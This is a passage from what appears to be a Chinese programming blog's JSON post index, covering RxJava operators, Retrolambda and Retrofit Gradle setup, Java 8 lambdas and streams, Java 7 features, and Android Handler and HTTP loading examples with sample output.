e.printStackTrace(); } return bitmap; }) .compose(A.applySchedulers()) 只需传入 A.applySchedulers() 返回的对象，即可后台处理，前台显示 .subscribe(bitmap -\u0026gt; mImageView.setImageBitmap(bitmap)); 加载 Bitmap 通过 Observable.defer(Func0) 实现延迟订阅 ------------------------------------------------------- public class A { private static String s; public static void main(String[] args) { Observable\u0026lt;String\u0026gt; observable = Observable.just(s); 直接执行 s = \u0026#34;ABC\u0026#34;; observable.subscribe(System.out::println); ---- 输出： null Observable\u0026lt;String\u0026gt; observable = Observable.defer(() -\u0026gt; Observable.just(s)); Func0 接口中的代码将延迟执行 s = \u0026#34;ABC\u0026#34;; observable.subscribe(System.out::println); ---- 输出： ABC } } Note： 0. just() 和 from() 在创建 Observable 时就存储了对象的值，而 create() 创建的 Observable 在 subscribe() 时才访问对象。 1. defer() 接收一个 Func0 接口并显式声明此接口返回一个 Observable 对象。 2. defer() 中的代码直到订阅才会执行。 通过 Schedulers 将耗时操作放到后台线程中执行 ------------------------------------------------------- public class A { public static void main(String[] args) throws InterruptedException { Schedulers.io().createWorker().schedule(() -\u0026gt; { Action0 接口中的代码将在 IO 线程中执行 System.out.println(Thread.currentThread()); System.exit(0); }); Thread.sleep(Integer.MAX_VALUE); } } ---- 输出： Thread[RxIoScheduler-2,5,main] Single ------------------------------------------------------- 被观察者 ---- Single\u0026lt;String\u0026gt; observable = Single.create(new Single.OnSubscribe\u0026lt;String\u0026gt;() { @Override public void call(SingleSubscriber\u0026lt;? super String\u0026gt; singleSubscriber) { singleSubscriber.onSuccess(\u0026#34;A\u0026#34;); } }); Single\u0026lt;String\u0026gt; observable = Single.just(\u0026#34;A\u0026#34;); 观察者 ---- SingleSubscriber\u0026lt;String\u0026gt; subscriber = new SingleSubscriber\u0026lt;String\u0026gt;() { SingleSubscriber @Override public void onSuccess(String value) { 成功 System.out.println(value); } @Override public void onError(Throwable error) { 异常 System.out.println(error.toString()); } }; 实例 ---- Single.just(\u0026#34;A\u0026#34;).subscribe(System.out::println); ---- 输出： A 延时执行 ------------------------------------------------------- public class A { public static void main(String[] args) throws InterruptedException { Observable\u0026lt;Integer\u0026gt; range = Observable.range(0, 3); range .delay(2, TimeUnit.SECONDS) 2 秒 .subscribe(System.out::println, System.out::println, () -\u0026gt; System.exit(0)); Thread.sleep(Integer.MAX_VALUE); ---- 输出：（延时 2 秒后执行） 0 1 2 Observable\u0026lt;Long\u0026gt; timer = Observable.timer(2, TimeUnit.SECONDS); 2 秒（timer 操作返回计时器 Observable） timer .delay(2, TimeUnit.SECONDS) 2 秒 .subscribe(System.out::println, System.out::println, () -\u0026gt; System.exit(0)); Thread.sleep(Integer.MAX_VALUE); ---- 输出：（延时 4 秒后执行） 0 } } 缓解 Backpressure（背部压力） ------------------------------------------------------- 缓冲事件 ---- public class A { public static void main(String[] args) throws InterruptedException { Observable .range(0, 10) .buffer(2) 将多个事件包装为 List\u0026lt;T\u0026gt;，缓冲区大小为 2 .subscribe(System.out::println); ---- 输出： [0, 1] [2, 3] [4, 5] [6, 7] [8, 9] Observable .range(0, 10) .buffer(2, 3) 将多个事件包装为 List\u0026lt;T\u0026gt;，缓冲区大小为 2，每次都跳过第 3 个事件 .subscribe(System.out::println); ---- 输出： [0, 1] [3, 4] [6, 7] [9] } } 过滤事件 ---- public class A { public static void main(String[] args) throws InterruptedException { Observable\u0026lt;Long\u0026gt; timer = Observable.timer(5, TimeUnit.SECONDS); 5 秒后发出事件（计时器） Observable .interval(500, TimeUnit.MILLISECONDS) 每隔 500 毫秒发出事件 .takeUntil(timer) 一直处理事件，直到 timer 发送了事件 .subscribe(System.out::println, System.out::println, () -\u0026gt; System.exit(0)); Thread.sleep(Integer.MAX_VALUE); ---- 输出：（CPU 时间不准，无过滤） 0 1 2 3 4 5 6 7 8 Observable .interval(500, TimeUnit.MILLISECONDS) .takeUntil(timer) .throttleFirst(1, TimeUnit.SECONDS) 每隔 1 秒发出时间段中的第一个事件 .subscribe(System.out::println, System.out::println, () -\u0026gt; System.exit(0)); Thread.sleep(Integer.MAX_VALUE); ---- 输出：（CPU 时间不准） 0 3 5 7 Observable .interval(500, TimeUnit.MILLISECONDS) .takeUntil(timer) .throttleLast(1, TimeUnit.SECONDS) 每隔 1 秒发出时间段中的最后一个事件（跟 sample() 行为一致） .subscribe(System.out::println, System.out::println, () -\u0026gt; System.exit(0)); Thread.sleep(Integer.MAX_VALUE); ---- 输出：（CPU 时间不准） 0 2 4 6 8 Observable debounce（去抖） .interval(500, TimeUnit.MILLISECONDS) .takeUntil(timer) .debounce(1, TimeUnit.SECONDS) 1 秒无新事件后，再发送其接收到的最后一个事件 .subscribe(System.out::println, System.out::println, () -\u0026gt; System.exit(0)); Thread.sleep(Integer.MAX_VALUE); ---- 输出：（CPU 时间不准） 8 } } ","permalink":"https://xhstormr.github.io/blog/posts/java-rxjava/","summary":"","title":"RxJava"},{"content":"Updated on 2016-11-12\nhttps://github.com/evant/gradle-retrolambda\nhttps://github.com/ReactiveX/RxAndroid\nhttps://github.com/JakeWharton/RxBinding\nhttps://github.com/square/retrofit\nProject build.gradle ⇳ classpath \u0026#39;com.android.tools.build:gradle:+\u0026#39; classpath \u0026#39;me.tatarka:gradle-retrolambda:+\u0026#39; Module build.gradle ⇳ apply plugin: \u0026#39;me.tatarka.retrolambda\u0026#39; android { compileOptions { sourceCompatibility JavaVersion.VERSION_1_8 targetCompatibility JavaVersion.VERSION_1_8 } } Gradle gradle-wrapper.properties ⇳ distributionUrl=http\\://android-mirror.bugly.qq.com:8080/gradle/gradle-3.2.1-all.zip RxAndroid Module build.gradle ⇳ compile \u0026#39;io.reactivex:rxandroid:+\u0026#39; compile \u0026#39;io.reactivex:rxjava:+\u0026#39; RxBinding Module build.gradle ⇳ compile \u0026#39;com.jakewharton.rxbinding:rxbinding:+\u0026#39; Retrofit Module build.gradle ⇳ compile \u0026#39;com.squareup.retrofit2:retrofit:+\u0026#39; compile \u0026#39;com.squareup.retrofit2:converter-gson:+\u0026#39; converter：JSON compile \u0026#39;com.squareup.retrofit2:converter-scalars:+\u0026#39; converter：String compile \u0026#39;com.squareup.retrofit2:adapter-rxjava2:+\u0026#39; adapter：RxJava ","permalink":"https://xhstormr.github.io/blog/posts/android-retrolambda/","summary":"","title":"Retrolambda"},{"content":"Updated on 2016-11-09\nStringJoiner | Optional\nhttps://docs.oracle.com/javase/10/docs/api/java/util/stream/Stream.html\nhttps://docs.oracle.com/javase/10/docs/api/java/util/stream/Collectors.html\nLambda Lambda 表达式（匿名方法 or 闭包）：由 参数列表、-\u0026gt;、函数体 组成。 参数列表：可以省略参数类型，编译器会根据上下文推导。 函数体：引用的局部变量会被隐式声明为 final。 代码块：用 { } 包裹的多条执行代码。 表达式：只有一条执行代码，省略了 { } 和 return。 若 没有传入额外参数，而 仅调用对象方法，则可以进一步简化整个 Lambda 表达式，转换为 方法引用。对象名::方法名 类名::方法名 类名::new 类名[]::new Lambda 表达式只能出现在目标类型为函数式接口的上下文中。 Lambda 表达式不会引入新作用域，函数体中的变量和外部环境中的变量具有相同的语义。 Predicate\u0026lt;String\u0026gt; filter = (String s) -\u0026gt; { 代码块 return s.endsWith(\u0026#34;.txt\u0026#34;); }; Predicate\u0026lt;String\u0026gt; filter = (String s) -\u0026gt; s.endsWith(\u0026#34;.txt\u0026#34;); 表达式 Predicate\u0026lt;String\u0026gt; filter = s -\u0026gt; s.endsWith(\u0026#34;.txt\u0026#34;); 省略参数类型 ------------------------------------------------------- Runnable runnable = () -\u0026gt; { 代码块 System.out.println(\u0026#34;123\u0026#34;); }; Runnable runnable = () -\u0026gt; System.out.println(\u0026#34;123\u0026#34;); 表达式 Runnable runnable = System.out::println; 若去掉 \u0026#34;123\u0026#34;，则可以转为方法引用（没有传入额外参数） ------------------------------------------------------- Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;).sort((String s1, String s2) -\u0026gt; { 代码块 return s1.compareTo(s2); }); Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;).sort((String s1, String s2) -\u0026gt; s1.compareTo(s2)); 表达式 Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;).sort((s1, s2) -\u0026gt; s1.compareTo(s2)); 省略参数类型 Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;).sort(String::compareTo); 方法引用（没有传入额外参数） ------------------------------------------------------- Comparator\u0026lt;Integer\u0026gt; comparator = (x, y) -\u0026gt; Integer.compare(x, y); 表达式 Comparator\u0026lt;Integer\u0026gt; comparator = Integer::compare; 方法引用（没有传入额外参数） Functional Interface 只含有一个抽象方法，因此可以被转换成 Lambda 表达式。\n抽象方法：自己 未实现，子类必须实现。void a(); 默认方法：自己 已实现，子类可以重写。default void b() { } 静态方法：自己 已实现，直接可以访问。static void c() { } @FunctionalInterface 注解：声明为函数式接口 public interface A { void a(); 抽象方法 default void b() { 默认方法 System.out.println(\u0026#34;默认方法\u0026#34;); } static void c() { 静态方法 System.out.println(\u0026#34;静态方法\u0026#34;); } } public class Test { public static void main(String[] args) { Runnable r = () -\u0026gt; System.out.println(\u0026#34;抽象方法\u0026#34;); 根据上下文推导出目标类型 ➜ Runnable A a = () -\u0026gt; System.out.println(\u0026#34;抽象方法\u0026#34;); 根据上下文推导出目标类型 ➜ A a.a(); a.b(); A.c(); } } ---- 输出： 抽象方法 默认方法 静态方法 Stream 支持串行处理和并行处理的 数据流。\n外部迭代：通过 for-each 循环来处理数据；同时承担 做什么 和 怎么做。 内部迭代：通过获得 Stream 来处理数据；只承担 做什么，由类库承担 怎么做。 中间操作（惰性求值）：不会立即执行，而是加入任务队列中，在终点操作时一并执行。 有限数据 ➜ 优化作用，无限数据 ➜ 决定作用（没有短路求值，操作无法停止）。 终点操作（急性求值）：通过短路求值的优化一并执行所有操作，以提供更高效的性能。 串行流（串行处理）：单线程。list.stream() stream.sequential() 并行流（并行处理）：多线程。list.parallelStream() stream.parallel() 中间操作： 过滤：filter。 排序：sorted。 去重：distinct。 最大：max。 最小：min。 消耗：peek。 转换：map（一对一）、flatMap（一对多）。映射 返回前 n 个元素：limit。最多执行次数 跳过前 n 个元素：skip。 终点操作： 收集：collect。 归约：reduce。 消耗：forEach。 且（全部 元素符合返回 true）：allMatch。 或（任一 元素符合返回 true）：anyMatch。 非（没有 元素符合返回 true）：noneMatch。 for (Shape shape : shapes){ 外部迭代 shape.setColor(RED); } ---- shapes.forEach(s -\u0026gt; s.setColor(RED)); 内部迭代（优） ------------------------------------------------------- int[] array = IntStream.range(0, 3).toArray(); 生成数组 [0, 1, 2] IntStream.range(0, 3).forEach(System.out::println); 替代 for 循环 ---- 输出： 0 1 2 ------------------------------------------------------- Stream .of(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;) .filter(s -\u0026gt; { System.out.println(\u0026#34;filter: \u0026#34; + s); return true; }) .map(s -\u0026gt; { System.out.println(\u0026#34;map: \u0026#34; + s); return s; }); 没有调用终点操作 ---- 输出：无 ---- Stream .of(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;) .filter(s -\u0026gt; { System.out.println(\u0026#34;filter: \u0026#34; + s); return true; }) .map(s -\u0026gt; { System.out.println(\u0026#34;map: \u0026#34; + s); return s; }) .anyMatch(s -\u0026gt; { 调用终点操作 System.out.println(\u0026#34;anyMatch: \u0026#34; + s); return s.startsWith(\u0026#34;B\u0026#34;); }); ---- 输出： （可以看出对元素的处理操作是垂直执行的，像在流水线依次经过每个操作，并通过短路求值尽可能减少操作次数） filter: A map: A anyMatch: A filter: B map: B anyMatch: B Note：filter 操作尽可能排在最前（短路求值），sorted 操作尽可能排在最后（sorted 操作遍历整个数据流） Optional 一种用于封装对象的容器，封装的对象可以为空，并且对空值进行处理。\npublic class A { public static void main(String[] args) { a(); System.out.println(\u0026#34;--------\u0026#34;); b(); } private static void a() { String s = \u0026#34;ABC\u0026#34;; Optional\u0026lt;String\u0026gt; optional = Optional.ofNullable(s); 对象不为空 System.out.println(optional.isPresent()); System.out.println(optional.orElse(\u0026#34;123\u0026#34;)); 接收一个缺省值 System.out.println(optional.orElseGet(() -\u0026gt; \u0026#34;123\u0026#34;)); 接收一个 Supplier 函数式接口 } private static void b() { String s = null; Optional\u0026lt;String\u0026gt; optional = Optional.ofNullable(s); 对象为空 System.out.println(optional.isPresent()); System.out.println(optional.orElse(\u0026#34;123\u0026#34;)); System.out.println(optional.orElseGet(() -\u0026gt; \u0026#34;123\u0026#34;)); } } ---- 输出： true ABC ABC -------- false 123 123 Code public class A { private static final List\u0026lt;Author\u0026gt; LIST = Arrays.asList( 作家列表 new Author(\u0026#34;Adam\u0026#34;, 23, Arrays.asList(\u0026#34;Java1\u0026#34;, \u0026#34;Java2\u0026#34;)), new Author(\u0026#34;Bell\u0026#34;, 19, Arrays.asList(\u0026#34;Python1\u0026#34;, \u0026#34;Python2\u0026#34;)), new Author(\u0026#34;Conan\u0026#34;, 23, Arrays.asList(\u0026#34;PHP1\u0026#34;, \u0026#34;PHP2\u0026#34;)), new Author(\u0026#34;David\u0026#34;, 26, Arrays.asList(\u0026#34;Ruby1\u0026#34;, \u0026#34;Ruby2\u0026#34;))); public static void main(String[] args) { Supplier\u0026lt;Stream\u0026lt;Author\u0026gt;\u0026gt; supplier = () -\u0026gt; LIST.stream().onClose(() -\u0026gt; System.out.println(\u0026#34;——————————————\u0026#34;)); 供应器 a(supplier); ↳ Stream 关闭时回调 Runnable 对象 b(supplier); c(supplier); d(); } private static void a(Supplier\u0026lt;Stream\u0026lt;Author\u0026gt;\u0026gt; supplier) { collect try (Stream\u0026lt;Author\u0026gt; stream = supplier.get()) { Set\u0026lt;Author\u0026gt; set = stream.filter(o -\u0026gt; o.mName.startsWith(\u0026#34;B\u0026#34;)).collect(Collectors.toSet()); 获得以 B 开头的姓名，toSet System.out.println(set); } try (Stream\u0026lt;Author\u0026gt; stream = supplier.get()) { List\u0026lt;Integer\u0026gt; list = stream.map(o -\u0026gt; o.mAge).distinct().sorted().collect(Collectors.toList()); 有哪些年龄，toList System.out.println(list); } try (Stream\u0026lt;Author\u0026gt; stream = supplier.get()) { Double aDouble = stream.collect(Collectors.averagingInt(o -\u0026gt; o.mAge)); 获得平均年龄 System.out.println(aDouble); } try (Stream\u0026lt;Author\u0026gt; stream = supplier.get()) { Map\u0026lt;Boolean, List\u0026lt;Author\u0026gt;\u0026gt; map = stream.collect(Collectors.partitioningBy(o -\u0026gt; o.mAge \u0026gt; 20)); 按年龄一分为二 map.forEach((key, value) -\u0026gt; System.out.printf(\u0026#34;%s: %s\\n\u0026#34;, key, value)); } try (Stream\u0026lt;Author\u0026gt; stream = supplier.get()) { Map\u0026lt;Integer, List\u0026lt;Author\u0026gt;\u0026gt; map = stream.collect(Collectors.groupingBy(o -\u0026gt; o.mAge)); 按年龄分组，toMap，未提供收集器（默认调用 toList()） map.forEach((key, value) -\u0026gt; System.out.printf(\u0026#34;%s: %s\\n\u0026#34;, key, value)); } try (Stream\u0026lt;Author\u0026gt; stream = supplier.get()) { Map\u0026lt;Integer, Integer\u0026gt; map = stream.collect(Collectors.groupingBy(o -\u0026gt; o.mAge, Collectors.summingInt(o -\u0026gt; 1))); 按年龄分组，toMap，提供收集器（指定收集行为） map.forEach((key, value) -\u0026gt; System.out.printf(\u0026#34;%s: %s\\n\u0026#34;, key, value)); } try (Stream\u0026lt;Author\u0026gt; stream = supplier.get()) { String s = stream.filter(o -\u0026gt; o.mAge \u0026gt; 20).map(o -\u0026gt; o.mName).collect(Collectors.joining(\u0026#34;, \u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;)); 连接作家名字 System.out.println(s); } try (Stream\u0026lt;Author\u0026gt; stream = supplier.get()) { Collector\u0026lt;Object, StringJoiner, String\u0026gt; myCollector = Collector.of( 自定义收集操作 () -\u0026gt; new StringJoiner(\u0026#34;, \u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;), supplier 供应器(开始) ((stringJoiner, o) -\u0026gt; stringJoiner.add(o.toString())), accumulator 累加器 (stringJoiner, stringJoiner2) -\u0026gt; stringJoiner.merge(stringJoiner2), combiner 组合器 (并行流使用) stringJoiner -\u0026gt; stringJoiner.toString()); finisher 终止器(结束) String s = stream.filter(o -\u0026gt; o.mAge \u0026gt; 20).map(o -\u0026gt; o.mName).collect(myCollector); 连接作家名字 System.out.println(s); } ---- 输出： [Bell] —————————————————————————— [19, 23, 26] —————————————————————————— 22.75 —————————————————————————— false: [Bell] true: [Adam, Conan, David] —————————————————————————— 19: [Bell] 23: [Adam, Conan] 26: [David] —————————————————————————— 19: 1 23: 2 26: 1 —————————————————————————— \u0026lt;Adam, Conan, David\u0026gt; —————————————————————————— \u0026lt;Adam, Conan, David\u0026gt; —————————————————————————— } private static void b(Supplier\u0026lt;Stream\u0026lt;Author\u0026gt;\u0026gt; supplier) { reduce try (Stream\u0026lt;Author\u0026gt; stream = supplier.get()) { Optional\u0026lt;Author\u0026gt; optional = stream.reduce((o1, o2) -\u0026gt; o1.mAge \u0026gt; o2.mAge ? o1 : o2); accumulator 累加器，获得最大年龄作家，不提供起始值（返回 Optional） optional.ifPresent(o -\u0026gt; System.out.println(o.mName + \u0026#34;_\u0026#34; + o.mAge)); } try (Stream\u0026lt;Author\u0026gt; stream = supplier.get()) { Author author = stream.reduce( new Author(\u0026#34;\u0026#34;, 0, new ArrayList\u0026lt;\u0026gt;()), 提供起始值 (o1, o2) -\u0026gt; o1.mAge \u0026gt; o2.mAge ? o1 : o2); accumulator 累加器，获得最大年龄作家 System.out.println(author.mName + \u0026#34;_\u0026#34; + author.mAge); } try (Stream\u0026lt;Author\u0026gt; stream = supplier.get()) { Integer integer = stream.reduce( 自定义归约操作 0, 起始值 (sum, o) -\u0026gt; sum += o.mAge, accumulator 累加器，获得年龄总和 (sum, sum2) -\u0026gt; sum + sum2); combiner 组合器 (并行流使用) System.out.println(integer); } ---- 输出： David_26 —————————————————————————— David_26 —————————————————————————— 91 —————————————————————————— } private static void c(Supplier\u0026lt;Stream\u0026lt;Author\u0026gt;\u0026gt; supplier) { flatMap try (Stream\u0026lt;Author\u0026gt; stream = supplier.get()) { String s = stream.flatMap(o -\u0026gt; o.mArticle.stream()).collect(Collectors.joining(\u0026#34;, \u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;)); 连接所有作家中的所有文章 System.out.println(s); } ---- 输出： \u0026lt;Java1, Java2, Python1, Python2, PHP1, PHP2, Ruby1, Ruby2\u0026gt; —————————————————————————— } private static void d() { Stream.generate(UUID::randomUUID).limit(5).forEach(System.out::println); ---- ↳ 无限生成 UUID，限制最多执行 5 次 输出： e9100622-3458-4c94-bc7a-dabcf99ebee9 bc18a526-945f-4fc6-a9fc-496c075aa99a 57a3882b-2eb6-4392-bb2f-31cb10acbece 82900c8e-e8d6-46de-a02f-9d37c5454f30 25ec7ee2-a963-43df-8c11-7008b4a68ccd Stream.iterate(0, n -\u0026gt; n + 2).limit(10).forEach(n -\u0026gt; System.out.print(n + \u0026#34; \u0026#34;)); ---- ↳ 无限迭代起始值，限制最多执行 10 次 输出： 0 2 4 6 8 10 12 14 16 18 List\u0026lt;String\u0026gt; list1 = new ArrayList\u0026lt;\u0026gt;(Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;)); List\u0026lt;String\u0026gt; list2 = new ArrayList\u0026lt;\u0026gt;(Arrays.asList(\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;)); Stream.of(list1, list2).peek(list -\u0026gt; list.addAll(Arrays.asList(\u0026#34;E\u0026#34;, \u0026#34;F\u0026#34;, \u0026#34;J\u0026#34;))).forEach(System.out::println); peek ---- 输出： [A, B, C, D, E, F, J] [A, B, C, D, E, F, J] } private static class Author { 作家 private String mName; 姓名 private int mAge; 年龄 private List\u0026lt;String\u0026gt; mArticle; 文章列表 private Author(String name, int age, List\u0026lt;String\u0026gt; article) { mName = name; mAge = age; mArticle = article; } @Override public String toString() { return mName; } } } ","permalink":"https://xhstormr.github.io/blog/posts/java-8/","summary":"","title":"Java 8"},{"content":"Updated on 2016-11-03\n二进制数字 int i = 0b1111; 15 数字可读性 int i = 100_000_000; 100000000 switch 支持字符串 String s = \u0026#34;A\u0026#34;; switch (s) { case \u0026#34;A\u0026#34;: System.out.println(\u0026#34;A\u0026#34;); break; case \u0026#34;B\u0026#34;: System.out.println(\u0026#34;B\u0026#34;); break; } catch 支持多重匹配 try { throw new ArithmeticException(); } catch (IllegalArgumentException | ArithmeticException | NullPointerException e) { 多重匹配 System.out.println(1); } catch (Exception e) { System.out.println(2); } 集合类型推断（Diamond） 之前：List\u0026lt;String\u0026gt; list = new ArrayList\u0026lt;String\u0026gt;(); 之后：List\u0026lt;String\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); 自动资源管理（ARM） 之前： BufferedWriter bufferedWriter = null; 资源 try { bufferedWriter = new BufferedWriter(new FileWriter(\u0026#34;D:/123.txt\u0026#34;, false)); bufferedWriter.write(\u0026#34;ABC\u0026#34;); 操作 } catch (IOException e) { e.printStackTrace(); } finally { try { if (bufferedWriter != null) { bufferedWriter.close(); 关闭 } } catch (IOException e) { e.printStackTrace(); } } 之后： try (BufferedWriter bufferedWriter1 = new BufferedWriter(new FileWriter(\u0026#34;D:/A.txt\u0026#34;, false)); 资源被隐式声明为 final（资源需实现 AutoCloseable 接口） BufferedWriter bufferedWriter2 = new BufferedWriter(new FileWriter(\u0026#34;D:/B.txt\u0026#34;, false))) { bufferedWriter1.write(\u0026#34;ABC\u0026#34;); 操作 bufferedWriter2.write(\u0026#34;ABC\u0026#34;); 操作 } catch (IOException e) { try 代码块结束后，资源自动调用 close() 方法（关闭顺序：最先声明的，最后关闭） e.printStackTrace(); } ","permalink":"https://xhstormr.github.io/blog/posts/java-7/","summary":"","title":"Java 7"},{"content":"Updated on 2016-11-01\n加载网页和图片 MainActivity.java public class MainActivity extends Activity { private WebView mWebView; private ImageView mImageView; private Handler mHandler = new Handler(new Handler.Callback() { 传入回调接口，避免内存泄漏 @Override public boolean handleMessage(Message msg) { 处理 Message（主线程 Looper） switch (msg.what) { case 1: WebSettings settings = mWebView.getSettings(); 获得 WebSettings 对象 settings.setUserAgentString(\u0026#34;Nexus\u0026#34;); 设置 User Agent settings.setJavaScriptEnabled(true); 启用 JavaScript mWebView.loadDataWithBaseURL(null, msg.obj.toString(), \u0026#34;text/html;charset=utf-8\u0026#34;, null, null); 加载网页 break; case 2: mImageView.setScaleType(ImageView.ScaleType.FIT_XY); 设置图片缩放模式为铺满控件 mImageView.setImageBitmap(((Bitmap) msg.obj)); 加载图片 break; } return true; } }); @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mWebView = (WebView) findViewById(R.id.webView); mImageView = (ImageView) findViewById(R.id.imageView); new MyThread(\u0026#34;http://blog.xhstormr.tk/\u0026#34;, \u0026#34;http://blog.xhstormr.tk/uploads/children-of-the-sun1.jpg\u0026#34;, mHandler).start(); 启动线程 } private static class MyThread extends Thread { private String mURL; private String mImage; private Handler mHandler; private MyThread(String URL, String image, Handler handler) { mURL = URL; mImage = image; mHandler = handler; } @Override public void run() { new Thread() { @Override public void run() { try { 下载网页 StringBuilder stringBuilder = new StringBuilder(); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL(mURL).openStream(), \u0026#34;utf-8\u0026#34;)); for (String s; (s = bufferedReader.readLine()) != null; ) { stringBuilder.append(s); } bufferedReader.close(); mHandler.obtainMessage(1, stringBuilder.toString()).sendToTarget(); 发送 Message（网页源代码） } catch (IOException e) { e.printStackTrace(); } } }.start(); 在新线程中执行，避免阻塞 try { 下载图片 BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL(mImage).openStream()); Bitmap bitmap = BitmapFactory.decodeStream(bufferedInputStream); bufferedInputStream.close(); mHandler.obtainMessage(2, bitmap).sendToTarget(); 发送 Message（Bitmap） } catch (IOException e) { e.printStackTrace(); } } } } activity_main.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:padding=\u0026#34;16dp\u0026#34; android:background=\u0026#34;@color/colorPrimary\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;WebView android:layout_weight=\u0026#34;1\u0026#34; 高度各占50% android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;0dp\u0026#34; android:id=\u0026#34;@+id/webView\u0026#34;/\u0026gt; \u0026lt;ImageView android:layout_weight=\u0026#34;1\u0026#34; 高度各占50% android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;0dp\u0026#34; android:id=\u0026#34;@+id/imageView\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/android-http/","summary":"","title":"Android HTTP (待)"},{"content":"Updated on 2016-10-29\nThreadLocal\nWeakReference\nSource Insight\nHandler：负责发送和处理 Message。 ThreadLocal：负责保存 Looper，作为线程的局部变量。 Looper：负责接收并转发 Message。 MessageQueue：负责存储 Message 的容器。 post ➜ Runnable MainActivity.java public class MainActivity extends Activity { private ImageView mImageView; private final Handler mHandler = new Handler(); private final Runnable mRunnable = new Runnable() { A：第一种（postDelayed） private int[] colors = {Color.parseColor(\u0026#34;red\u0026#34;), Color.parseColor(\u0026#34;blue\u0026#34;), Color.parseColor(\u0026#34;green\u0026#34;)}; 颜色 private int index; 索引 @Override public void run() { index++; index %= 3; mImageView.setBackgroundColor(colors[index]); 设置背景颜色 mHandler.postDelayed(this, 1000); 封装线程体为 Message 中的 callback，再传递至 Looper 中的 MessageQueue，并延迟 1 秒后执行 } ↳ 使用了递归思想，无限循环 }; private Thread mThread = new Thread() { B：第二种（post） private int[] colors = {Color.parseColor(\u0026#34;red\u0026#34;), Color.parseColor(\u0026#34;blue\u0026#34;), Color.parseColor(\u0026#34;green\u0026#34;)}; 颜色 @Override public void run() { while (!Thread.interrupted()) { 判断线程是否为中断状态 for (final int color : colors) { 遍历颜色 mHandler.post(new Runnable() { 封装线程体为 Message 中的 callback，再传递至 Looper 中的 MessageQueue @Override public void run() { mImageView.setBackgroundColor(color); 设置背景颜色 } }); try { Thread.sleep(1000); 当前线程进入阻塞状态 1 秒 } catch (InterruptedException e) { 阻塞状态下中断线程将引发该异常，且中断状态将被清除 return; 直接返回 } } } } }; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mImageView = (ImageView) findViewById(R.id.imageView); 需实现每隔 1 秒更换此 ImageView 背景颜色 } @Override protected void onDestroy() { super.onDestroy(); mHandler.removeCallbacksAndMessages(null); A 移除 Looper 中的 MessageQueue 中所有等待处理的 Message mThread.interrupt(); B 中断线程 } public void onClick(View view) { A switch (view.getId()) { case R.id.button1: mHandler.post(mRunnable); 封装线程体为 Message 中的 callback，再传递至 Looper 中的 MessageQueue break; case R.id.button2: mHandler.removeCallbacksAndMessages(null); 移除 Looper 中的 MessageQueue 中所有等待处理的 Message break; } } public void onClick(View view) { B switch (view.getId()) { case R.id.button1: mThread.start(); 启动线程 break; case R.id.button2: mThread.interrupt(); 中断线程 break; } } } activity_main.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:padding=\u0026#34;16dp\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;ImageView android:layout_gravity=\u0026#34;center\u0026#34; android:layout_width=\u0026#34;150dp\u0026#34; android:layout_height=\u0026#34;150dp\u0026#34; android:id=\u0026#34;@+id/imageView\u0026#34;/\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;开始\u0026#34; android:id=\u0026#34;@+id/button1\u0026#34;/\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;停止\u0026#34; android:id=\u0026#34;@+id/button2\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; sendMessage ➜ Message MainActivity.java public class MainActivity extends Activity { private TextView mTextView; private final Handler mHandler = new Handler(new Handler.Callback() { @Override public boolean handleMessage(Message msg) { 处理 Message（主线程） mTextView.setText(1 + \u0026#34;:\u0026#34; + msg.what + \u0026#34;:\u0026#34; + msg.arg1 + \u0026#34;:\u0026#34; + msg.arg2 + \u0026#34;:\u0026#34; + msg.obj); return msg.what != 0; true 代表拦截（不传递），false 代表不拦截（传递） } }) { @Override public void handleMessage(Message msg) { 处理 Message（主线程） mTextView.setText(2 + \u0026#34;:\u0026#34; + msg.what + \u0026#34;:\u0026#34; + msg.arg1 + \u0026#34;:\u0026#34; + msg.arg2 + \u0026#34;:\u0026#34; + msg.obj); } }; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); 